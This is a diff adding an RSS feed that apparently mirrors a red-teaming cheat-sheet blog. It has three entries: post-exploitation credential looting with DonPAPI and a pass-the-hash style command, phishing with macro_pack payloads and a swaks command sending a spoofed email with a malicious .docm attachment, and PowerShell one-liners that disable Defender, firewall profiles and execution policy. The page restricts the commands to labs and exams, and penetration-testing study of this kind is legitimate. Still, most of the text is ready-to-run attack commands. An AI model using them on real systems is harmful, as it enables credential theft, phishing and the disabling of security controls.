@@ -1,0 +1,879 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) – Red Teaming</title><link>https://fyx.me/tags/red-teaming/</link><description>Recent content in Red Teaming on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 04 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://fyx.me/tags/red-teaming/index.xml" rel="self" type="application/rss+xml"/><item><title>Post Exploitation &amp; Looting</title><link>https://fyx.me/bazaar/windows/post-exploitation--looting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/post-exploitation--looting/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-orange-100 hx-bg-orange-50 hx-text-orange-800 dark:hx-border-orange-400/30 dark:hx-bg-orange-400/20 dark:hx-text-orange-300">
+&lt;p class="hx-flex hx-items-center hx-font-medium">Tbd&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Looting secrets with &lt;a href="https://github.com/login-securite/DonPAPI?tab=readme-ov-file#collection" target="_blank" rel="noopener">DonPAPI&lt;/a>&lt;span class="hx-absolute -hx-mt-20" id="looting-secrets-with-donpapihttpsgithubcomlogin-securitedonpapitabreadme-ov-filecollection">&lt;/span>
+&lt;a href="#looting-secrets-with-donpapihttpsgithubcomlogin-securitedonpapitabreadme-ov-filecollection" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Important&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>&lt;ul>
+&lt;li>You need to provide a password file containing username and password so DonPAPI can decrypt the encrypted files using masterkeys and what not.&lt;/li>
+&lt;li>Folders/Files under &lt;code>C:\Users\&amp;lt;user&amp;gt;\AppData\Local\Microsoft\Credentials&lt;/code> are hidden. You need to use &lt;code>dir /f&lt;/code> or &lt;code>Get-ChildItem -force&lt;/code> to see them.&lt;/li>
+&lt;/ul>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">donpapi collect -t target.lab.local -u adminuser -H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3 -d lab.local --pwdfile ./creds.txt&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>Example &lt;code>pwdfile&lt;/code>:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div class="filename" dir="auto">creds.txt&lt;/div>&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">jane.doe:World123!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">octave:RubberTrain99
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john.elton:Ilovemusic1723&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3>DCSync&lt;span class="hx-absolute -hx-mt-20" id="dcsync">&lt;/span>
+&lt;a href="#dcsync" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;h4>Errors&lt;span class="hx-absolute -hx-mt-20" id="errors">&lt;/span>
+&lt;a href="#errors" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;blockquote>
+&lt;p>The distinguished name specified for this replication operation is invalid.&lt;/p>
+&lt;/blockquote>
+&lt;p>You don&amp;rsquo;t have perms.&lt;/p>
+&lt;blockquote>
+&lt;p>Ref: &lt;a href="https://blog.spookysec.net/domain-controller-sync/" target="_blank" rel="noopener">https://blog.spookysec.net/domain-controller-sync/&lt;/a>&lt;/p>
+&lt;/blockquote></description></item><item><title>Phishing</title><link>https://fyx.me/bazaar/phishing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/phishing/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>&lt;/svg>Warning&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>WIP&amp;hellip; Only added basic commmands now that seem to work quite well for test environments with basic security controls aka MS Defender AV.&lt;/p>
+&lt;p>These most likely wont work against any EDR solution&amp;hellip; DYOR.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Word Macros&lt;span class="hx-absolute -hx-mt-20" id="word-macros">&lt;/span>
+&lt;a href="#word-macros" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Important&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>&lt;code>docx&lt;/code> word docs don&amp;rsquo;t execute macros (they may be contained in the document but in read only mode), create a &lt;code>docm&lt;/code> or &lt;code>doc&lt;/code> instead&lt;/p>
+&lt;p>Focus on &lt;code>hta&lt;/code>, &lt;code>docm&lt;/code>, and &lt;code>js&lt;/code> payloads&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h4>Macro pack&lt;span class="hx-absolute -hx-mt-20" id="macro-pack">&lt;/span>
+&lt;a href="#macro-pack" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;blockquote>
+&lt;p>MacroPack Community is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format. It also handles various shortcuts formats.&lt;/p>
+&lt;/blockquote>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List all supported file formats&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">macro_pack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-listformats&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List all available templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">macro_pack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-listtemplates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Craft a payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Note&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>The &lt;code>EmbedExe&lt;/code> template has been quite good in the past as it allows you to provide you C2 payload directly via &lt;code>exe&lt;/code> or &lt;code>bin&lt;/code> , utilising either a &lt;code>smb&lt;/code> beacon or &lt;code>http&lt;/code> beacon.&lt;/p>
+&lt;p>When using the &lt;code>smb&lt;/code> beacon, you can try and spray the network to guess if its running or not&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Sending Emails: &lt;code>swaks&lt;/code>&lt;span class="hx-absolute -hx-mt-20" id="sending-emails-swaks">&lt;/span>
+&lt;a href="#sending-emails-swaks" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>To send emails to a mail service (eg. SMTP, IMAP, etc) from the command line, &lt;code>swaks&lt;/code> is your go to tool.&lt;/p>
+&lt;p>It provides nice features for attaching documents, spoofing senders, etc.&lt;/p>
+&lt;h4>Sending emails with payloads as attachments&lt;span class="hx-absolute -hx-mt-20" id="sending-emails-with-payloads-as-attachments">&lt;/span>
+&lt;a href="#sending-emails-with-payloads-as-attachments" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># links in body can be used if the user is going to click on it&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># otherwise you can also attach files to it&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># --server : mail server&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># --attach @totally-not-malicious.docm : attach the file name `totally-not-malicious.docm` to the email &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># --suppress-data : don&amp;#39;t print the attachment back to you&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">swaks --from vladimir.putin@target.com --to sam.altman@target.com --header &lt;span class="s1">&amp;#39;Subject: Company Notification&amp;#39;&lt;/span> --body &lt;span class="s1">&amp;#39;Hi Sam, we want to hear from you! Please complete the following survey. https://mywebsite.com/mysurvey.hta&amp;#39;&lt;/span> --server 10.10.10.10 --attach @totally-not-malicious.docm --suppress-data&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>Refs&lt;span class="hx-absolute -hx-mt-20" id="refs">&lt;/span>
+&lt;a href="#refs" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;a href="https://github.com/cymerkabrol/doc-macro-exploit" target="_blank" rel="noopener">https://github.com/cymerkabrol/doc-macro-exploit&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/itm4n/VBA-RunPE" target="_blank" rel="noopener">https://github.com/itm4n/VBA-RunPE&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="https://github.com/Inf0secRabbit/BadAssMacros" target="_blank" rel="noopener">https://github.com/Inf0secRabbit/BadAssMacros&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Defence Evasion</title><link>https://fyx.me/bazaar/windows/defence-evasion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/defence-evasion/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-red-200 hx-bg-red-100 hx-text-red-900 dark:hx-border-red-200/30 dark:hx-bg-red-900/30 dark:hx-text-red-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Caution&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>Only use these in controlled test environments which can be reset easily (eg. CTFs, boot2root, Offsec Exams)&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>Disabling defences&lt;span class="hx-absolute -hx-mt-20" id="disabling-defences">&lt;/span>
+&lt;a href="#disabling-defences" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>Disable defender, all firewall rules and set execution policy to unrestricted:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ExecutionPolicy&lt;/span> &lt;span class="n">Unrestricted&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Profile&lt;/span> &lt;span class="n">Domain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Private&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBehaviorMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBlockAtFirstSeen&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableEmailScanning&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPReference&lt;/span> &lt;span class="n">-DisableScriptScanning&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MpPreference&lt;/span>&lt;span class="p">;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>Execution Policy blocking commands&lt;span class="hx-absolute -hx-mt-20" id="execution-policy-blocking-commands">&lt;/span>
+&lt;a href="#execution-policy-blocking-commands" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-noexit&lt;/span> &lt;span class="n">-ExecutionPolicy&lt;/span> &lt;span class="n">Bypass&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">optional cmd you wish to run&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># show execution policy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ExecutionPolicy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># remove execution policy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ExecutionPolicy&lt;/span> &lt;span class="n">Unrestricted&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>Firewall&lt;span class="hx-absolute -hx-mt-20" id="firewall">&lt;/span>
+&lt;a href="#firewall" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable all Firewall profiles (Requires Admin privileges).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Profile&lt;/span> &lt;span class="n">Domain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Private&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>Defender&lt;span class="hx-absolute -hx-mt-20" id="defender">&lt;/span>
+&lt;a href="#defender" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Turn off everything and set exclusion to &amp;#34;C:\Windows\Temp&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBehaviorMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableBlockAtFirstSeen&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPreference&lt;/span> &lt;span class="n">-DisableEmailScanning&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MPPReference&lt;/span> &lt;span class="n">-DisableScriptScanning&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Set-MpPreference&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># -----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check if Defender is enabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MpComputerStatus&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MpComputerStatus&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">AntivirusEnabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check if defensive modules are enabled&lt;/span>
